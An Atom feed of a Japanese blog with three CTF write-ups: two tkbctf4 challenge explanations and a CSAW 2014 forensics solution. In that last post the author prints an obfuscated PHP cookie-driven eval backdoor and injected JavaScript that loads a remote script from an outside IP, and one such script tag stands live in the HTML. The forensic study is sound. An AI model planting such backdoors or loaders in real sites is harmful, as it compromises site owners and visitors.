<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | Hello (forgotten) world]]></title>
  <link href="http://tech.aquarite.info/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://tech.aquarite.info/"/>
  <updated>2014-11-24T07:40:08+09:00</updated>
  <id>http://tech.aquarite.info/</id>
  <author>
    <name><![CDATA[Mei Akizuru]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[tkbctf4 [misc 400] amida]]></title>
    <link href="http://tech.aquarite.info/blog/2014/11/24/tkbctf4-amida/"/>
    <updated>2014-11-24T06:11:50+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/11/24/tkbctf4-amida</id>
    <content type="html"><![CDATA[<p><a href="/blog/2014/11/24/tkbctf4-cheerofcpu/">Cheer of CPU</a>に続きましてmisc 400、amidaでございます。</p>

<p>この問題は私と@yuscarletによる作成です。</p>

<h1>問題</h1>

<blockquote><p><code>203.178.132.117:42719</code></p>

<p><a href="http://en.wikipedia.org/wiki/Ghost_Leg">Ghost Leg - Wikipedia, the free encyclopedia</a></p></blockquote>

<p>現在問題文中のサーバーは停止しています。こちらもソースコードはgithubで公開されていますので、試したい方はどうぞ。<a href="https://github.com/tkbctf/tkbctf4/tree/master/misc400_amida">tkbctf4/misc400_amida at master · tkbctf/tkbctf4</a></p>

<p>なお実際の問題は<a href="https://github.com/mayth/fafrotskies">fafrotskies</a>というCPUを100%持っていく素敵な自作サーバーと連携して動作していました。</p>

<p>問題中に英語版Wikipediaの&#8221;Ghost Leg&#8221;の記事にリンクが張ってありますが、「あみだくじ」って英語では&#8221;Ghost Leg&#8221;というそうです。</p>

<h1>概要</h1>

<p>所定のサーバーにアクセスすると無駄なようこそメッセージの後にBase64な文字列が降ってきます。これをデコードするとPNG画像が現れます。画像の内容はあみだくじの画像で、縦棒の各上端（始点）に番号が振られていて、縦棒のうち1つの下端（終点）に黒丸があります。黒丸に辿り着くような始点の番号をサーバーに送りつけて、正解なら次の問題が送られてきて、不正解ならその場で切断されます。こんな感じで1ステージ50問×20ステージ、計1000問解くとフラグが降ってきます。</p>

<p>とはいえまぁ単純なあみだくじを1000問も解かせるなんてことはないわけです。5ステージを1つのブロックとすると4つのブロックがあるわけですが、最初のブロックから次のような感じであみだくじが変化していきます。</p>

<ol>
<li>普通のあみだくじ</li>
<li>横線が波線になる（横線の始点と終端のy座標は同じ）</li>
<li>あみだくじが回転する（0°〜359°）</li>
<li>横線が波線になり、かつ回転する</li>
</ol>


<p>で、各ブロックの最初のステージでは縦線が4本ですが、次のステージでは5本、その次では6本……となり、ブロックの5ステージ目では縦線が8本になります。次のブロックに進むと縦線の数は4本に戻り再び8本まで増えていきます。</p>

<p>この辺はリポジトリの<code>casegen</code>を参照してください。<code>casegen</code>はステージ数を受け取ってそれを元に<code>amida_ev</code>に渡す引数を変えるRubyスクリプトです。<code>amida_ev</code>は<code>generator.cpp</code>をコンパイルしたバイナリで、それに渡す引数で生成されるあみだくじが変わるようになっています。<code>-r</code>で回転、<code>-w</code>で波線、<code>-nN</code>で縦線がN本になります。</p>

<p>なお、さすがに全問解かないとフラグが来ないのでは時間的に誰も辿り着けない可能性があったので、問題投入後しばらくしてから各ブロックの終了時にチェックポイントを追加し、結果的に配点が変わりました。元々最終フラグのsubmitで300点でしたが、チェックポイント3つと最終フラグ1つの計4つのフラグにそれぞれ100点を割り振り合計400点の問題となりました。</p>

<p>結局競技時間内に最終フラグをsubmit出来たチームはありませんでしたが、非常に惜しいことになっていたチームがあったようで……</p>

<blockquote class="twitter-tweet" lang="ja"><p>何がCongrats!だ，checkpointという文字列を入れろ</p>&mdash; まーす (@__math) <a href="https://twitter.com/__math/status/529212264402804736">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>




<blockquote class="twitter-tweet" lang="ja"><p>まーす氏にあみだプログラム貰って俺の環境でも動かしてたら終了5分前に1つヒットする→ログに吐いてない→大慌てでうさみみ64bit版落としてくる→終了30秒後にメモリから救出出来る</p>&mdash; きひろちゃん (@aki33524) <a href="https://twitter.com/aki33524/status/529212031551815680">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>私「（最終）フラグはcheckpointじゃない」</p>

<h1>プログラムについて</h1>

<p>地味に面倒なことをしています。元々単純に縦線を描画して、y座標をランダムに生成してそこに横線を描く（なお横線が直線だとは言っていない）、という実装だったんですが、横線が連続してしまうケースとか、終端に横線がくっついてしまうケースとかがあって、その辺を調整した上で横線の座標を決定する辺りを@yuscarletに書いてもらいました。それ以外にはオプションのパースの実装も書いてもらっています。</p>

<p>なので私はあまりその辺のロジックはあまり苦労してなくて（逆に言うとロジックで面倒なところは全部やってもらった）、むしろ私を苦しめたのはcairoだったのでした……。何が一番つらかったかってPNG画像をファイルに吐くか、吐き出すデータ(<code>unsigned char*</code>)を受け取るコールバックを指定して吐き出すかのどちらかしか選択肢がなくて、「えっ適当なバッファに全部吐き出す関数とかそういうのないんですかファイルに出力する関数はあるのにえっ？」ってなってました。しかもコールバックに渡されるデータはどうやら「逐次」渡され、PNGファイル全体を出力するまでコールバックは複数回呼ばれるという仕様でいよいよ私の睡眠時間は0に近付いていきましたとさ。</p>

<p>そんな感じで、久々にグローバルに<code>unsigned char *buffer</code>とかいう変数を宣言しつつ、あとは適当にネットに転がっているbase64の実装を拾ってきてバッファ上のPNGファイルデータをエンコードして出力するようなプログラムを仕上げました。</p>

<p>ちなみに私が元々「サンプル実装」として書いたコードが出発点なせいで相当なクソコードになってたのでtkbctf4前半（1日目）終了後に書き直した上でbase64エンコードとかその辺追加してました。時間がないときに限って書き直したくなる法則が発動しました。おかげで寝られませんでした。</p>

<h1>感想とか諸々</h1>

<h2>元ネタ</h2>

<p>名前が名前だけに気付いている人もいましたが、この問題の元ネタは夏に行われたSECCON 2014オンライン予選で出題された「あみだくじ」です（リポジトリのREADMEにも記述しています）。</p>

<p>「あみだくじ」でやることとしてはこの問題と同じで所定の終端に辿り着く始点の番号をひたすら答えるとフラグがもらえる、という問題でした。この問題と異なる点はこんな感じ。</p>

<ul>
<li>あみだくじが画像じゃない（アスキーアート）</li>
<li>あみだくじがbase64じゃない</li>
<li>あみだくじが任意の角度に回転しない（アスキーアートだし）</li>
<li>あみだくじが上下反転する（180°の回転ではなくて上下のフリップという感じ）</li>
<li>実行バイナリが配布される形式であり、ローカルで試行出来る</li>
<li>何度実行しても出題される内容や順序は全く同じ</li>
<li>出題の度にsleepが挟まれている</li>
</ul>


<p>元ネタになった問題を解いたのも私と@yuscarletでして、まぁなんというか地味に苦しめられたというかなんというか。「任意の」角度には回転しないもののあみだくじが横向きになるとかはあって、形式が変わったためにプログラムが例外吐いて死ぬ度に私たちも悲鳴を上げながらプログラムを修正していく作業をひたすらしてました（最終的には総当たりしたんですけど）。それはともかく、その記憶がまだ鮮明に残っている中で私と@yuscarletで酒を飲んでるときに「なんかもっと嫌らしい『あみだくじ』作れねえかな」みたいな話になって、まずは画像化しようって話になって、「画像化してもなんか世の中には線認識ライブラリくらい転がってるから大丈夫じゃろｗ」とか言いながら適当にサンプル的な出題プログラムの実装書いてたらマジでそのまま問題になっちゃったって感じです。この段階ではもっと強烈な加工をかけることも考えてましたが自分たちで解法が実装どころか思いつきすらしなかったのでやめました。</p>

<p>まぁそういうわけで、つまるところ酔った勢いみたいなところは大いにあるわけで、</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/shiracamus">@shiracamus</a> 相当恨らまれてるな、これはｗ</p>&mdash; しらかみゅ (@shiracamus) <a href="https://twitter.com/shiracamus/status/529182836943630336">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>決して恨んでるわけではないです……はい……。（むしろ前述のfafrotskiesがCPUを100%持っていくので私が鯖管に恨まれている可能性の方が高い）</p>

<p>あとは元ネタの方のwrite-upを書いてあるのでそちらで。 <a href="/blog/2014/07/20/seccon2014-online-amida/">SECCON 2014 オンライン予選 【あみだくじ】</a></p>

<h2>難易度、解法とか</h2>

<p>元ネタとの相違で挙げた最後の2点だけでもぼちぼち難易度違ったんじゃないかなぁと思っています。というのも、ローカルで試行出来て何度やっても同じということはトライアンドエラーがいくらでも効くということで、実際私たちはこの問題を総当たりで解いています（sleepはopに潰してもらいましたが）。&#8221;amida&#8221;では問題生成はサーバー側で、しかも毎回ランダムに問題が生成されるのでそういうわけにはいかず、まともにあみだくじのソルバを書く必要があります。といっても、あみだくじの構造さえわかってしまえばソルバの実装自体は大して難しくはなくて、事実上「いかに回転する画像と戦いながら画像を認識するか」という問題だったと思います（横線が波線になるのは回転に比べれば大した問題ではないです）。</p>

<p>ちなみに初期の段階での想定解実装はOpenCVを使っていて、波線にした瞬間爆死したので真面目に線の認識をすると逆に死ぬんじゃないかと思います。その辺上手く手抜き（？）して直接ピクセルデータ見に行って云々ってやった方が確実ですし、そもそもOpenCVとか入れなくていいんで幸せになれたのではないでしょうか。</p>

<p>チェックポイント追加後のフラグ送信スピードとか見てるとやっぱ回転する辺りが大きな関門になってたのかなぁという印象です。黒丸のy座標を使うとか色々方法はあったようですが、ぶっちゃけこちらの想定解よりよほど頭のいい解法を皆さん考えられててすごいなぁと思って見てました（小並感）。</p>

<h1>最後に</h1>

<p>酔った勢いでも問題のアイディアは出てくるので、作問で詰まったら酒を飲もう！！！！（確か日本酒飲んでた気がする）</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[tkbctf4 [bin300] Cheer of CPU]]></title>
    <link href="http://tech.aquarite.info/blog/2014/11/24/tkbctf4-cheerofcpu/"/>
    <updated>2014-11-24T04:16:38+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/11/24/tkbctf4-cheerofcpu</id>
    <content type="html"><![CDATA[<p>tkbctf4が終了してからずいぶんと時間が経ちましたが皆様いかがお過ごしでしょうか。今更ではありますが[bin300] Cheer of CPUの解説というか、そんなようなものを書いてみようかと。</p>

<p>なお、問題のソースコードと配布されたバイナリはtkbctfのgithubリポジトリにあるので、そちらもどうぞ。 <a href="https://github.com/tkbctf/tkbctf4/tree/master/bin300_CheerOfCPU">tkbctf4/bin300_CheerOfCPU at master · tkbctf/tkbctf4</a></p>

<h1>問題</h1>

<blockquote><p>Did you hear a cheer of CPU?</p>

<p>The flag is the SHA-256 checksum of the program&rsquo;s output.</p>

<p>sample: <code>ruby -rdigest/sha2 -e 'puts Digest::SHA256.hexdigest("OUTPUT HERE".strip).downcase'</code></p>

<p><a href="https://s3-ap-northeast-1.amazonaws.com/tkbctf4/cheerofcpu">https://s3-ap-northeast-1.amazonaws.com/tkbctf4/cheerofcpu</a></p></blockquote>

<h1>概要</h1>

<p>問題の内容としてはあるプログラムが渡されるのでそれを調べる、というものです。プログラムは何かしら入力するとそれが所定の文字列と一致するかを調べ、一致していたら何らかのテキストを出力します。そのテキストのSHA256値を取って送りつければ得点となります。これだけ聞くととっても簡単ですが問題はコイツが<strong>64bit Mach-Oバイナリ</strong>ということでした。</p>

<h1>経緯</h1>

<p>元々は「なんか怪しげな言語でバイナリ吐いて読ませるような問題を作ろうぜ」というのが出発点です。様々な言語が候補に現れては消えていきましたが、私がちょうどMacを持ってるということでSwiftに白羽の矢が立ちました。（ちなみにこの発想から作られたもうひとつの問題は&#8221;rakuda&#8221;です。あの問題、なんか別ゲーになってる気がしますけど）</p>

<p>たださすがに当初はx86_64 Mach-Oで出すという想定はしていませんでした。が、コマンドラインアプリケーションとして作ってしまったのでiOSアプリにすることもできず、かといってSwiftコンパイラがそもそもx86環境向けのバイナリを吐けるようにできていないので、まぁそういう問題もありかなみたいな判断で結局x86_64 64bit Mach-Oで出題しました。</p>

<p>たださすがにMac OS X 10.10 (Yosemite) SDK使ったのはやりすぎだったかなと反省しております（とはいえ、私の環境には1つ前のバージョン、すなわち10.9 MavericksのSDKまでしか入ってなかったわけですが）。</p>

<h1>プログラムに関して</h1>

<p>というわけではじめてのSwiftかいはつ、となったんですがなんかSwiftの記法が結構キモくて大変でした（※個人の感想です）。</p>

<p>内容について触れておきます。内部でテキストデータは基本的に<code>Byte</code>(<code>UInt8</code>)の配列と<code>Int</code>の配列のタプルで保持されています。<code>strings</code>対策ですね。タプルの1つ目の要素がシャッフルされ、暗号化された状態のテキストのバイト列、2つ目の要素がシャッフル順です。シャッフルと書きましたが、テキストのバイト列はシャッフルされた後に暗号化された状態で保持されており、元の順番に復元するための情報が2つ目の要素にある配列、ということになります。暗号化は単純なxorですが、1要素暗号化する度にキーが変化するようになっています。その辺はソースコードを見て頂ければ。なお、最終的に出力されるテキストデータだけは、正解のキーを元にして生成された暗号化鍵と初期化ベクタを用いて、ChaCha20で暗号化された状態で保持しています。ちなみにChaCha20採用の理由ですが、CryptoSwiftに入っていたから以外に特に理由はないです。</p>

<p>動作としては概要で述べたもので、起動すると入力待ちになるので「キー」を入力します。これを内部で保持しているデータと比較し、一致していればそのキーを用いて鍵と初期化ベクタを生成し、テキストデータを復号化して出力します。</p>

<h1>作ってみた・出してみた感想とか諸々</h1>

<p>問題の難易度的には明らかに「プログラムが動く（または解析出来る）環境を用意出来るか否か」がハードルという感じでしたね。動かせる環境(Yosemite)があれば総当たりで行ける問題だなぁとか元々思ってたので事実上CTFプレイヤーにおけるMac普及率調査みたいになっていた感じもあります。別にApple信者でもなんでもないのでMac買ってくださいとは言いませんが。あるいはIDA Pro（無料版でない）があれば解析可能だったかと思います。私は持ってませんがopがやってたのでたぶん大丈夫だったんでしょう、たぶん（ていうかtkbctf4のバイナリ問はIDA Pro Freeで解析可能な問題の方が少なかったという異常事態でしたね）。</p>

<p>皆さんはこの無駄に高いハードルを超えて（Macを買うにしろIDA Proを買うにしろ『素人が購入するとは考えにくい』お値段故、素人ではないであろう皆さんでも難しいでしょう）「CPUの歓声」を聞くことは出来たでしょうか。</p>

<p>ちなみに、これ出題してから&#8221;tkbctf&#8221;とか色々なワードでTwitterで検索かけてまして、64bit Mach-Oバイナリに思わず「歓声」を上げる皆さんを見て爆笑してたりしました（こういうのを性格が悪いと言います）。</p>

<p>あとタイトルの元ネタの鮮度がちと古かった気がするなぁという感もあります。ソースコード上げたリポジトリのREADMEにも書きましたが、皆さん覚えているでしょうか。時は5ヶ月前、2014年6月。WWDC 2014で世にSwiftが発表され、The Swift Programming Languageが公開された後にTwitterを席巻した、あの衝撃の発言を。</p>

<blockquote class="twitter-tweet" data-cards="hidden" lang="ja"><p>Swiftの関数はHaskell風。これはいい。マシン語が透けて見える。CPUの歓声が聞こえてきそうだ <a href="http://t.co/tfWwKe5e03">pic.twitter.com/tfWwKe5e03</a></p>&mdash; Ryo Shimizu (@shi3z) <a href="https://twitter.com/shi3z/status/473627881055485952">2014, 6月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>（もちろんこの前後にも<strong>とても素晴らしい発言</strong>があるわけですが）</p>

<p>Swiftの関数はHaskell風、マシン語が透けて見える、CPUの歓声が聞こえてきそう——もう見るだけで頭がクラクラしてきそうな圧倒的で革新的で先進的で最も優れた表現力を持ったこのツイートに感銘を受け、今回の問題はSwiftで書かれているということで、このツイートをリスペクトして問題名にしました。このような素晴らしいツイートを世に送り出してくださったRyo Shimizu(@shi3z)氏にはこの場を借りて感謝の意を述べさせて頂きます。</p>

<p>しかしながら、個人的に「マシン語が透けて見える」というとこちらの方を推しておきます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>マシン語が透けて見える。CPUの歓声が聞こえてきそうだ <a href="http://t.co/drJMSTIdFQ">pic.twitter.com/drJMSTIdFQ</a></p>&mdash; 秋弦めい☂小傘ちゃんかわいい (@maytheplic) <a href="https://twitter.com/maytheplic/status/473701724574605313">2014, 6月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<h1>最後に</h1>

<p><strong>小傘ちゃんかわいい。</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Forensics]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/"/>
    <updated>2014-09-23T03:07:38+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。</p>

<h1>[100] dumpster diving</h1>

<h2>問題文</h2>

<blockquote><p>dumpsters are cool, but cores are cooler</p>

<p>Written by marc</p>

<p>firefox.mem.zip</p></blockquote>

<h2>解答</h2>

<p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>

<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>

<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>

<pre><code>(前略)
etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
ZZZZZZZZZZZZZZTransparent BG enabling flag
(後略)
</code></pre>

<p>マジで見つかりました。本当にありがとうございました。</p>

<h1>[200] why not sftp?</h1>

<h2>問題文</h2>

<blockquote><p>well seriously, why not?</p>

<p>Written by marc</p>

<p>traffic-5.pcap</p></blockquote>

<h2>解答</h2>

<p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>

<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>

<p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>

<p>余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。</p>

<h1>[300] Fluffy No More</h1>

<h2>問題文</h2>

<blockquote><p>OH NO WE&rsquo;VE BEEN HACKED!!!!!! &ndash; said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site&rsquo;s users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious &ldquo;Forgotten Freaks&rdquo; hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>

<p>Well&hellip; The fluff needs your stuff. I&rsquo;ve pulled the logs from the server for you along with a backup of it&rsquo;s database and configuration. Figure out what is going on!</p>

<p>Written by brad_anton</p>

<p>CSAW2014-FluffyNoMore-v0.1.tar.bz2</p></blockquote>

<h2>解答</h2>

<p>Answer: Those Fluffy Bunnies Make Tummy Bumpy</p>

<p>与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。</p>

<p>/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。</p>

<p>まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、<a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog</a>で言及されているのと同じ形のログが残っていました。</p>

<p>アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。</p>

<pre><code>&lt;?php
$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
?&gt;
</code></pre>

<p><code>$hije</code>が<code>str_replace</code>、<code>$vyoh</code>が<code>base64_decode</code>、<code>$bpzy</code>が<code>create_function</code>関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して<code>$hoge()</code>みたいに<code>()</code>を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。</p>

<p>それはともかくとして、このコードは</p>

<ol>
<li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
<li>その中の&#8217;sq&#8217;を取り除く</li>
<li>その文字列をBase64デコードする</li>
<li>その文字列を関数化する</li>
<li>それを実行する</li>
</ol>


<p>というコードです。<code>create_function</code>で関数化されたコードは次のコードです（実際の出力を整形しています）</p>

<pre><code>$c='count';
$a=$_COOKIE;
if (reset($a) == 'ha' &amp;&amp; $c($a) &gt; 3) {
  $k='ckit';
  echo '&lt;'.$k.'&gt;';
  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
  echo '&lt;/'.$k.'&gt;';
}
</code></pre>

<p>Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。</p>

<p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>

<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>

<pre><code>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
</code></pre>

<p>ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。</p>

<p>それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。<a href="https://github.com/aFarkas/html5shiv">HTML5Shivのリポジトリ</a>から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。</p>

<pre><code>var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");
</code></pre>

<p><a href="http://jsbeautifier.org/">beautify</a>してみます。</p>

<pre><code>var g = "ti";
var c = "HTML Tags";
var f = ". li colgroup br src datalist script option .";
f = f.split(" ");
c = "";
k = "/";
m = f[6];
for (var i = 0; i &lt; f.length; i++) {
    c += f[i].length.toString();
}
v = f[0];
x = "\'ht";
b = f[4];
f = 2541 * 6 - 35 + 46 + 12 - 15269;
c += f.toString();
f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
c += f.toString();
f = "";
c = c.split("");
var w = 0;
u = "s";
for (var i = 0; i &lt; c.length; i++) {
    if (((i == 3 || i == 6) &amp;&amp; w != 2) || ((i == 8) &amp;&amp; w == 2)) {
        f += String.fromCharCode(46);
        w++;
    }
    f += c[i];
}
i = k + "anal";
document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");
</code></pre>

<p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>

<p>&#8220;`</p>

<script src='http://128.238.66.100/analytics.js'></script>


<pre><code>
つまりhtml5.jsが実行されると'http://128.238.66.100/analytics.js'が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。
</code></pre>

<p>var _0x91fe = [&ldquo;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&rdquo;, &ldquo;\x5F\x73\x65\x6C\x66&rdquo;, &ldquo;\x6F\x70\x65\x6E&rdquo;];
window<a href="_0x91fe[0],%20_0x91fe[1]">_0x91fe[2]</a>;
&#8220;`</p>

<p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>

<pre><code>&gt; var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
undefined
&gt; _0x91fe
[ 'http://128.238.66.100/announcement.pdf',
  '_self',
  'open' ]
</code></pre>

<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>

<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>

<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>

<pre><code>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
</code></pre>

<p>JavaScriptっぽいのでnodeに与えてみます。</p>

